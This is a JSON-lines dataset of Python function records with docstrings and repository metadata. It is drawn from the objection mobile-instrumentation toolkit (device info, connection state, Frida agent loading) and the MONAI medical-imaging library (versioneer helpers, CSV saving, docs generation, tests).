{"docstring": "\"\"\"\n    Get information about an attached device.\n\"\"\"\n\n", "func_signal": "def device_type():\n", "code": "try:\n\n    # Inject the agent\n    agent = Agent()\n    agent.inject()\n    state_connection.set_agent(agent=agent)\n\n    device_name, system_name, model, system_version = get_device_info()\n\nexcept frida.ProcessNotFoundError as e:\n\n    click.secho('Could not connect with error: {0}'.format(str(e)), fg='red')\n    print_frida_connection_help()\n\n    return\n\nif state_connection.get_comms_type() == state_connection.TYPE_USB:\n    click.secho('Connection: USB')\n\nelif state_connection.get_comms_type() == state_connection.TYPE_REMOTE:\n    click.secho('Connection: Network')\n\nclick.secho('Name: {0}'.format(device_name))\nclick.secho('System: {0}'.format(system_name))\nclick.secho('Model: {0}'.format(model))\nclick.secho('Version: {0}'.format(system_version))", "path": "objection/objection/console/cli.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Monkey patches the LiteCLI config to toggle\n    settings that make more sense for us.\n\n    :param rc:\n    :return:\n\"\"\"\n\n", "func_signal": "def modify_config(rc):\n", "code": "c = real_get_config(rc)\nc['main']['less_chatty'] = 'True'\nc['main']['enable_pager'] = 'False'\n\nreturn c", "path": "objection/objection/commands/sqlite.py", "commit_date": "2019-10-18 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Returns the currently configured connection type as a string.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def get_comms_type_string(self) -> str:\n", "code": "t = self.get_comms_type()\n\nif t == self.TYPE_USB:\n    return 'usb'\n\nif t == self.TYPE_REMOTE:\n    return 'net'\n\nreturn ''", "path": "objection/objection/state/connection.py", "commit_date": "2018-07-30 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Init a new job state manager. This method will also\n    register an atexit(), ensuring that cleanup operations\n    are performed on jobs when this class is GC'd.\n\"\"\"\n\n", "func_signal": "def __init__(self) -> None:\n", "code": "self.jobs = []\n\natexit.register(self.cleanup)", "path": "objection/objection/state/jobs.py", "commit_date": "2019-02-25 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Prints information about the iOS environment.\n\n    This includes the current OS version as well as directories\n    of interest for the current applications Documents, Library and\n    main application bundle.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def _get_ios_environment() -> None:\n", "code": "paths = state_connection.get_api().env_ios_paths()\n\nclick.secho('')\nclick.secho(tabulate(paths.items(), headers=['Name', 'Path']))", "path": "objection/objection/commands/device.py", "commit_date": "2019-03-18 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Get device information by first checking which runtimes\n    are available, and then extracting information about the\n    device based on the result.\n\"\"\"\n\n", "func_signal": "def get_device_info() -> tuple:\n", "code": "api = state_connection.get_api()\n\n# set the frida version\nfrida = api.env_frida()\ndevice_state.frida_version = frida['version']\n\nenvironment = api.env_runtime()\n\n# ios device information\nif environment == 'ios':\n    device_state.device_type = Ios\n    package_info = api.env_ios()\n\n    # {'applicationName': 'za.sensepost.ipewpew',\n    # 'deviceName': 'iPhone 7 Plus',\n    # 'identifierForVendor': 'foo',\n    # 'model': 'iPhone', 'systemName': 'iOS', 'systemVersion': '12.1'}\n    device_state.os_version = package_info['systemVersion']\n\n    return pretty_concat(package_info['applicationName'], 30, left=True), \\\n           package_info['systemName'], package_info['model'], package_info['systemVersion']\n\n# android device information\nif environment == 'android':\n    device_state.device_type = Android\n    package_info = api.env_android()\n\n    # {'application_name': 'com.sensepost.apewpew',\n    # 'board': 'universal5422', 'brand': 'samsung', 'device': 'foo',\n    # 'host': 'foo.bar', 'id': '1234', 'model': 'foo-bar',\n    # 'product': 'foo', 'user': 'root', 'version': '7.1.2'}\n    device_state.os_version = package_info['version']\n\n    return pretty_concat(package_info['application_name'], 30, left=True), \\\n           package_info['device'], package_info['brand'], package_info['version']", "path": "objection/objection/commands/device.py", "commit_date": "2019-03-18 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Init a new connection state, defaulting to a USB\n    connection.\n\"\"\"\n\n", "func_signal": "def __init__(self) -> None:\n", "code": "self.usb = True\nself.network = False\nself.host = '127.0.0.1'\nself.port = 27042\nself._type = self.TYPE_USB\nself.device_serial = None\n\nself.gadget_name = 'Gadget'\nself.agent = None\nself.api = None", "path": "objection/objection/state/connection.py", "commit_date": "2018-07-30 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Start the objection API server in headless mode.\n\"\"\"\n\n", "func_signal": "def api():\n", "code": "agent = Agent()\n\ntry:\n    agent.inject()\nexcept frida.ServerNotRunningError as e:\n    click.secho('Unable to connect to the frida server: {error}'.format(error=str(e)), fg='red')\n    return\n\nstate_connection.set_agent(agent=agent)\n\nclick.secho('Starting API server on {host}:{port}'.format(\n    host=app_state.api_host, port=app_state.api_port), fg='yellow', bold=True)\n\napi_state.start(app_state.api_host, app_state.api_port, app_state.debug)", "path": "objection/objection/console/cli.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Injects the script sources in a new Frida session.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def inject(self) -> None:\n", "code": "if not self.script_src:\n    raise Exception('Unable to discover Frida script source to inject')\n\nif not self.agent:\n    self.agent = state_connection.get_agent()\n\nif not self.session:\n    self.session = self.agent.get_session()\n\nif not self.script:\n    self.script = self.session.create_script(source=self.script_src)\n\n# check for a custom message handler, otherwise fallback\n# to the default objection handler\nself.script.on('message', self.on_message_handler if self.on_message_handler else self.agent.on_message)\n\nself.script.load()\nself.api = self.script.exports", "path": "objection/objection/utils/plugin.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Clean up all of the job in the job manager.\n\n    This method is typical called when at the end of an\n    objection session.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def cleanup(self) -> None:\n", "code": "for job in self.jobs:\n\n    try:\n\n        click.secho('[job manager] Job: {0} - Stopping'.format(job.id), dim=True)\n        job.end()\n\n    except frida.InvalidOperationError:\n\n        click.secho(('[job manager] Job: {0} - An error occurred stopping job. Device may '\n                     'no longer be available.'.format(job.id)), fg='red', dim=True)", "path": "objection/objection/state/jobs.py", "commit_date": "2019-02-25 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Get the style to use for our prompt\n\n    :return:\n\"\"\"\n\n", "func_signal": "def get_prompt_style() -> Style:\n", "code": "return Style.from_dict({\n    # completions menu\n    'completion-menu.completion.current': 'bg:#00aaaa #000000',\n    'completion-menu.completion': 'bg:#008888 #ffffff',\n\n    # fuzzy match outside\n    'completion-menu.completion fuzzymatch.outside': 'fg:#000000',\n\n    # Prompt.\n    'applicationname': '#007cff',\n    'on': '#00aa00',\n    'devicetype': '#00ff48',\n    'version': '#00ff48',\n    'connection': '#717171'\n})", "path": "objection/objection/console/repl.py", "commit_date": "2019-06-21 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Prints information about the Android environment.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def _get_android_environment() -> None:\n", "code": "paths = state_connection.get_api().env_android_paths()\n\nclick.secho('')\nclick.secho(tabulate(paths.items(), headers=['Name', 'Path']))", "path": "objection/objection/commands/device.py", "commit_date": "2019-03-18 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    If the http_api() function is defined in the child class, take\n    it's return (it should always return a flask.Blueprint) and append\n    it to the existing blueprints in objections core API.\n\n    The ApiState class will handle the loading and starting of the API\n    with them included.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def _append_to_api(self):\n", "code": "if not hasattr(self, 'http_api'):\n    return\n\nif not callable(getattr(self, 'http_api')):\n    raise Exception('The http_api property must be a function returning a Flask Blueprint')\n\napi_state.append_api_blueprint(getattr(self, 'http_api')())", "path": "objection/objection/utils/plugin.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"Write the given version number to the given _version.py file.\"\"\"\n", "func_signal": "def write_to_version_file(filename, versions):\n", "code": "os.unlink(filename)\ncontents = json.dumps(versions, sort_keys=True, indent=1, separators=(\",\", \": \"))\nwith open(filename, \"w\") as f:\n    f.write(SHORT_VERSION_PY % contents)\n\nprint(\"set %s to '%s'\" % (filename, versions[\"version\"]))", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"\nWrites the cached dict to a csv\n\n\"\"\"\n", "func_signal": "def finalize(self) -> None:\n", "code": "if not self.overwrite and os.path.exists(self._filepath):\n    with open(self._filepath, \"r\") as f:\n        reader = csv.reader(f)\n        for row in reader:\n            self._cache_dict[row[0]] = np.array(row[1:]).astype(np.float32)\n\nif not os.path.exists(self.output_dir):\n    os.makedirs(self.output_dir)\nwith open(self._filepath, \"w\") as f:\n    for k, v in self._cache_dict.items():\n        f.write(k)\n        for result in v.flatten():\n            f.write(\",\" + str(result))\n        f.write(\"\\n\")", "path": "MONAI/monai/data/csv_saver.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Generate API docs automatically by trawling the available modules\"\"\"\n", "func_signal": "def generate_apidocs(*args):\n", "code": "module_path = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"monai\"))\noutput_path = os.path.abspath(os.path.join(os.path.dirname(__file__), \"apidocs\"))\napidoc_command_path = \"sphinx-apidoc\"\nif hasattr(sys, \"real_prefix\"):  # called from a virtualenv\n    apidoc_command_path = os.path.join(sys.prefix, \"bin\", \"sphinx-apidoc\")\n    apidoc_command_path = os.path.abspath(apidoc_command_path)\nprint(f\"output_path {output_path}\")\nprint(f\"module_path {module_path}\")\nsubprocess.check_call(\n    [apidoc_command_path, \"-e\"]\n    + [\"-o\", output_path]\n    + [module_path]\n    + [os.path.join(module_path, p) for p in exclude_patterns]\n)", "path": "MONAI/docs/source/conf.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Try to determine the version from _version.py if present.\"\"\"\n", "func_signal": "def versions_from_file(filename):\n", "code": "try:\n    with open(filename) as f:\n        contents = f.read()\nexcept EnvironmentError:\n    raise NotThisMethod(\"unable to read _version.py\")\nmo = re.search(r\"version_json = '''\\n(.*)'''  # END VERSION_JSON\", contents, re.M | re.S)\nif not mo:\n    mo = re.search(r\"version_json = '''\\r\\n(.*)'''  # END VERSION_JSON\", contents, re.M | re.S)\nif not mo:\n    raise NotThisMethod(\"no version_json in _version.py\")\nreturn json.loads(mo.group(1))", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Try to determine the version from the parent directory name.\n\nSource tarballs conventionally unpack into a directory that includes both\nthe project name and a version string. We will also support searching up\ntwo directory levels for an appropriately named parent directory\n\"\"\"\n", "func_signal": "def versions_from_parentdir(parentdir_prefix, root, verbose):\n", "code": "rootdirs = []\n\nfor i in range(3):\n    dirname = os.path.basename(root)\n    if dirname.startswith(parentdir_prefix):\n        return {\n            \"version\": dirname[len(parentdir_prefix) :],\n            \"full-revisionid\": None,\n            \"dirty\": False,\n            \"error\": None,\n            \"date\": None,\n        }\n    else:\n        rootdirs.append(root)\n        root = os.path.dirname(root)  # up a level\n\nif verbose:\n    print(\"Tried directories %s but none started with prefix %s\" % (str(rootdirs), parentdir_prefix))\nraise NotThisMethod(\"rootdir doesn't start with parentdir_prefix\")", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Extract version information from the given file.\"\"\"\n# the code embedded in _version.py can just fetch the value of these\n# keywords. When used from setup.py, we don't want to import _version.py,\n# so we do it with a regexp instead. This function is not used from\n# _version.py.\n", "func_signal": "def git_get_keywords(versionfile_abs):\n", "code": "keywords = {}\ntry:\n    f = open(versionfile_abs, \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(\"git_refnames =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"refnames\"] = mo.group(1)\n        if line.strip().startswith(\"git_full =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"full\"] = mo.group(1)\n        if line.strip().startswith(\"git_date =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"date\"] = mo.group(1)\n    f.close()\nexcept EnvironmentError:\n    pass\nreturn keywords", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "# only keep results >= threshold\n", "func_signal": "def print_results(results, discovery_time, thresh, status):\n", "code": "results = dict(filter(lambda x: x[1] > thresh, results.items()))\nif len(results) == 0:\n    return\nprint(f\"\\n\\n{status}, printing completed times >{thresh}s in ascending order...\\n\")\ntimings = dict(sorted(results.items(), key=lambda item: item[1]))\n\nfor r in timings:\n    if timings[r] >= thresh:\n        print(f\"{r} ({timings[r]:.03}s)\")\nprint(f\"test discovery time: {discovery_time:.03}s\")\nprint(f\"total testing time: {sum(results.values()):.03}s\")\nprint(\"Remember to check above times for any errors!\")", "path": "MONAI/tests/runner.py", "commit_date": "2020-11-09 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Store f in HANDLERS[vcs][method].\"\"\"\n", "func_signal": "def decorate(f):\n", "code": "if vcs not in HANDLERS:\n    HANDLERS[vcs] = {}\nHANDLERS[vcs][method] = f\nreturn f", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Read the project setup.cfg file to determine Versioneer config.\"\"\"\n# This might raise EnvironmentError (if setup.cfg is missing), or\n# configparser.NoSectionError (if it lacks a [versioneer] section), or\n# configparser.NoOptionError (if it lacks \"VCS=\"). See the docstring at\n# the top of versioneer.py for instructions on writing your setup.cfg .\n", "func_signal": "def get_config_from_root(root):\n", "code": "setup_cfg = os.path.join(root, \"setup.cfg\")\nparser = configparser.SafeConfigParser()\nwith open(setup_cfg, \"r\") as f:\n    parser.readfp(f)\nVCS = parser.get(\"versioneer\", \"VCS\")  # mandatory\n\ndef get(parser, name):\n    if parser.has_option(\"versioneer\", name):\n        return parser.get(\"versioneer\", name)\n    return None\n\ncfg = VersioneerConfig()\ncfg.VCS = VCS\ncfg.style = get(parser, \"style\") or \"\"\ncfg.versionfile_source = get(parser, \"versionfile_source\")\ncfg.versionfile_build = get(parser, \"versionfile_build\")\ncfg.tag_prefix = get(parser, \"tag_prefix\")\nif cfg.tag_prefix in (\"''\", '\"\"'):\n    cfg.tag_prefix = \"\"\ncfg.parentdir_prefix = get(parser, \"parentdir_prefix\")\ncfg.verbose = get(parser, \"verbose\")\nreturn cfg", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "# convolve 32 down to 2 channels\n", "func_signal": "def forward(self, x):\n", "code": "out = self.conv_block(x)\nout = self.act_function1(out)\nout = self.conv2(out)\nreturn out", "path": "MONAI/monai/networks/nets/vnet.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Get version information or return default if unable to do so.\"\"\"\n# I am in _version.py, which lives at ROOT/VERSIONFILE_SOURCE. If we have\n# __file__, we can work backwards from there to the root. Some\n# py2exe/bbfreeze/non-CPython implementations don't do __file__, in which\n# case we can only use expanded keywords.\n\n", "func_signal": "def get_versions():\n", "code": "cfg = get_config()\nverbose = cfg.verbose\n\ntry:\n    return git_versions_from_keywords(get_keywords(), cfg.tag_prefix,\n                                      verbose)\nexcept NotThisMethod:\n    pass\n\ntry:\n    root = os.path.realpath(__file__)\n    # versionfile_source is the relative path from the top of the source\n    # tree (where the .git directory might live) to this file. Invert\n    # this to find the root from __file__.\n    for i in cfg.versionfile_source.split('/'):\n        root = os.path.dirname(root)\nexcept NameError:\n    return {\"version\": \"0+unknown\", \"full-revisionid\": None,\n            \"dirty\": None,\n            \"error\": \"unable to find root of source tree\",\n            \"date\": None}\n\ntry:\n    pieces = git_pieces_from_vcs(cfg.tag_prefix, root, verbose)\n    return render(pieces, cfg.style)\nexcept NotThisMethod:\n    pass\n\ntry:\n    if cfg.parentdir_prefix:\n        return versions_from_parentdir(cfg.parentdir_prefix, root, verbose)\nexcept NotThisMethod:\n    pass\n\nreturn {\"version\": \"0+unknown\", \"full-revisionid\": None,\n        \"dirty\": None,\n        \"error\": \"unable to compute version\", \"date\": None}", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Get version from 'git describe' in the root of the source tree.\n\nThis only gets called if the git-archive 'subst' keywords were *not*\nexpanded, and _version.py hasn't already been rewritten with a short\nversion string, meaning we're inside a checked out source tree.\n\"\"\"\n", "func_signal": "def git_pieces_from_vcs(tag_prefix, root, verbose, run_command=run_command):\n", "code": "GITS = [\"git\"]\nif sys.platform == \"win32\":\n    GITS = [\"git.cmd\", \"git.exe\"]\n\nout, rc = run_command(GITS, [\"rev-parse\", \"--git-dir\"], cwd=root, hide_stderr=True)\nif rc != 0:\n    if verbose:\n        print(\"Directory %s not under git control\" % root)\n    raise NotThisMethod(\"'git rev-parse --git-dir' returned error\")\n\n# if there is a tag matching tag_prefix, this yields TAG-NUM-gHEX[-dirty]\n# if there isn't one, this yields HEX[-dirty] (no NUM)\ndescribe_out, rc = run_command(\n    GITS, [\"describe\", \"--tags\", \"--dirty\", \"--always\", \"--long\", \"--match\", \"%s*\" % tag_prefix], cwd=root\n)\n# --long was added in git-1.5.5\nif describe_out is None:\n    raise NotThisMethod(\"'git describe' failed\")\ndescribe_out = describe_out.strip()\nfull_out, rc = run_command(GITS, [\"rev-parse\", \"HEAD\"], cwd=root)\nif full_out is None:\n    raise NotThisMethod(\"'git rev-parse' failed\")\nfull_out = full_out.strip()\n\npieces = {}\npieces[\"long\"] = full_out\npieces[\"short\"] = full_out[:7]  # maybe improved later\npieces[\"error\"] = None\n\n# parse describe_out. It will be like TAG-NUM-gHEX[-dirty] or HEX[-dirty]\n# TAG might have hyphens.\ngit_describe = describe_out\n\n# look for -dirty suffix\ndirty = git_describe.endswith(\"-dirty\")\npieces[\"dirty\"] = dirty\nif dirty:\n    git_describe = git_describe[: git_describe.rindex(\"-dirty\")]\n\n# now we have TAG-NUM-gHEX or HEX\n\nif \"-\" in git_describe:\n    # TAG-NUM-gHEX\n    mo = re.search(r\"^(.+)-(\\d+)-g([0-9a-f]+)$\", git_describe)\n    if not mo:\n        # unparseable. Maybe git-describe is misbehaving?\n        pieces[\"error\"] = \"unable to parse git-describe output: '%s'\" % describe_out\n        return pieces\n\n    # tag\n    full_tag = mo.group(1)\n    if not full_tag.startswith(tag_prefix):\n        if verbose:\n            fmt = \"tag '%s' doesn't start with prefix '%s'\"\n            print(fmt % (full_tag, tag_prefix))\n        pieces[\"error\"] = \"tag '%s' doesn't start with prefix '%s'\" % (full_tag, tag_prefix)\n        return pieces\n    pieces[\"closest-tag\"] = full_tag[len(tag_prefix) :]\n\n    # distance: number of commits since tag\n    pieces[\"distance\"] = int(mo.group(2))\n\n    # commit: short hex revision ID\n    pieces[\"short\"] = mo.group(3)\n\nelse:\n    # HEX: no tags\n    pieces[\"closest-tag\"] = None\n    count_out, rc = run_command(GITS, [\"rev-list\", \"HEAD\", \"--count\"], cwd=root)\n    pieces[\"distance\"] = int(count_out)  # total number of commits\n\n# commit date: see ISO-8601 comment in git_versions_from_keywords()\ndate = run_command(GITS, [\"show\", \"-s\", \"--format=%ci\", \"HEAD\"], cwd=root)[0].strip()\npieces[\"date\"] = date.strip().replace(\" \", \"T\", 1).replace(\" \", \"\", 1)\n\nreturn pieces", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Render the given version pieces into the requested style.\"\"\"\n", "func_signal": "def render(pieces, style):\n", "code": "if pieces[\"error\"]:\n    return {\n        \"version\": \"unknown\",\n        \"full-revisionid\": pieces.get(\"long\"),\n        \"dirty\": None,\n        \"error\": pieces[\"error\"],\n        \"date\": None,\n    }\n\nif not style or style == \"default\":\n    style = \"pep440\"  # the default\n\nif style == \"pep440\":\n    rendered = render_pep440(pieces)\nelif style == \"pep440-pre\":\n    rendered = render_pep440_pre(pieces)\nelif style == \"pep440-post\":\n    rendered = render_pep440_post(pieces)\nelif style == \"pep440-old\":\n    rendered = render_pep440_old(pieces)\nelif style == \"git-describe\":\n    rendered = render_git_describe(pieces)\nelif style == \"git-describe-long\":\n    rendered = render_git_describe_long(pieces)\nelse:\n    raise ValueError(\"unknown style '%s'\" % style)\n\nreturn {\n    \"version\": rendered,\n    \"full-revisionid\": pieces[\"long\"],\n    \"dirty\": pieces[\"dirty\"],\n    \"error\": None,\n    \"date\": pieces.get(\"date\"),\n}", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"\nEvaluates the polynomial defined by `coef` at `x`.\n\nFor a 1D sequence of coef (length n), evaluate::\n\n    y = coef[n-1] + x * (coef[n-2] + ... + x * (coef[1] + x * coef[0]))\n\nArgs:\n    coef: a sequence of floats representing the coefficients of the polynomial\n    x: float or a sequence of floats representing the variable of the polynomial\n\nReturns:\n    1D torch tensor\n\"\"\"\n", "func_signal": "def polyval(coef, x) -> torch.Tensor:\n", "code": "device = x.device if torch.is_tensor(x) else None\ncoef = torch.as_tensor(coef, dtype=torch.float, device=device)\nif coef.ndim == 0 or (len(coef) < 1):\n    return torch.zeros(x.shape)\nx = torch.as_tensor(x, dtype=torch.float, device=device)\nans = coef[0]\nfor c in coef[1:]:\n    ans = ans * x + c\nreturn ans  # type: ignore", "path": "MONAI/monai/networks/layers/convutils.py", "commit_date": "2020-10-16 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Get the project version from whatever source is available.\n\nReturns dict with two keys: 'version' and 'full'.\n\"\"\"\n", "func_signal": "def get_versions(verbose=False):\n", "code": "if \"versioneer\" in sys.modules:\n    # see the discussion in cmdclass.py:get_cmdclass()\n    del sys.modules[\"versioneer\"]\n\nroot = get_root()\ncfg = get_config_from_root(root)\n\nassert cfg.VCS is not None, \"please set [versioneer]VCS= in setup.cfg\"\nhandlers = HANDLERS.get(cfg.VCS)\nassert handlers, \"unrecognized VCS '%s'\" % cfg.VCS\nverbose = verbose or cfg.verbose\nassert cfg.versionfile_source is not None, \"please set versioneer.versionfile_source\"\nassert cfg.tag_prefix is not None, \"please set versioneer.tag_prefix\"\n\nversionfile_abs = os.path.join(root, cfg.versionfile_source)\n\n# extract version from first of: _version.py, VCS command (e.g. 'git\n# describe'), parentdir. This is meant to work for developers using a\n# source checkout, for users of a tarball created by 'setup.py sdist',\n# and for users of a tarball/zipball created by 'git archive' or github's\n# download-from-tag feature or the equivalent in other VCSes.\n\nget_keywords_f = handlers.get(\"get_keywords\")\nfrom_keywords_f = handlers.get(\"keywords\")\nif get_keywords_f and from_keywords_f:\n    try:\n        keywords = get_keywords_f(versionfile_abs)\n        ver = from_keywords_f(keywords, cfg.tag_prefix, verbose)\n        if verbose:\n            print(\"got version from expanded keyword %s\" % ver)\n        return ver\n    except NotThisMethod:\n        pass\n\ntry:\n    ver = versions_from_file(versionfile_abs)\n    if verbose:\n        print(\"got version from file %s %s\" % (versionfile_abs, ver))\n    return ver\nexcept NotThisMethod:\n    pass\n\nfrom_vcs_f = handlers.get(\"pieces_from_vcs\")\nif from_vcs_f:\n    try:\n        pieces = from_vcs_f(cfg.tag_prefix, root, verbose)\n        ver = render(pieces, cfg.style)\n        if verbose:\n            print(\"got version from VCS %s\" % ver)\n        return ver\n    except NotThisMethod:\n        pass\n\ntry:\n    if cfg.parentdir_prefix:\n        ver = versions_from_parentdir(cfg.parentdir_prefix, root, verbose)\n        if verbose:\n            print(\"got version from parentdir %s\" % ver)\n        return ver\nexcept NotThisMethod:\n    pass\n\nif verbose:\n    print(\"unable to compute version\")\n\nreturn {\n    \"version\": \"0+unknown\",\n    \"full-revisionid\": None,\n    \"dirty\": None,\n    \"error\": \"unable to compute version\",\n    \"date\": None,\n}", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "# Params to determine the implementation to test\n", "func_signal": "def test_cpu_approx(self, test_case_description, sigmas, input, expected):\n", "code": "        device = torch.device(\"cpu\")\n        fast_approx = True\n# Create input tensor and apply filter\n        input_tensor = torch.from_numpy(np.array(input)).to(dtype=torch.float, device=device)\n        output = BilateralFilter.apply(input_tensor, *sigmas, fast_approx).cpu().numpy()\n# Ensure result are as expected\n        np.testing.assert_allclose(output, expected, atol=1e-5)", "path": "MONAI/tests/test_bilateral_approx_cpu.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Get the project root directory.\n\nWe require that all commands are run from the project root, i.e. the\ndirectory that contains setup.py, setup.cfg, and versioneer.py .\n\"\"\"\n", "func_signal": "def get_root():\n", "code": "root = os.path.realpath(os.path.abspath(os.getcwd()))\nsetup_py = os.path.join(root, \"setup.py\")\nversioneer_py = os.path.join(root, \"versioneer.py\")\nif not (os.path.exists(setup_py) or os.path.exists(versioneer_py)):\n    # allow 'python path/to/setup.py COMMAND'\n    root = os.path.dirname(os.path.realpath(os.path.abspath(sys.argv[0])))\n    setup_py = os.path.join(root, \"setup.py\")\n    versioneer_py = os.path.join(root, \"versioneer.py\")\nif not (os.path.exists(setup_py) or os.path.exists(versioneer_py)):\n    err = (\n        \"Versioneer was unable to run the project root directory. \"\n        \"Versioneer requires setup.py to be executed from \"\n        \"its immediate directory (like 'python setup.py COMMAND'), \"\n        \"or in a way that lets it use sys.argv[0] to find the root \"\n        \"(like 'python path/to/setup.py COMMAND').\"\n    )\n    raise VersioneerBadRootError(err)\ntry:\n    # Certain runtime workflows (setup.py install/develop in a setuptools\n    # tree) execute all dependencies in a single python process, so\n    # \"versioneer\" may be imported multiple times, and python's shared\n    # module-import table will cache the first one. So we can't use\n    # os.path.dirname(__file__), as that will find whichever\n    # versioneer.py was first imported, even in later projects.\n    me = os.path.realpath(os.path.abspath(__file__))\n    me_dir = os.path.normcase(os.path.splitext(me)[0])\n    vsr_dir = os.path.normcase(os.path.splitext(versioneer_py)[0])\n    if me_dir != vsr_dir:\n        print(\"Warning: build in %s is using versioneer.py from %s\" % (os.path.dirname(me), versioneer_py))\nexcept NameError:\n    pass\nreturn root", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
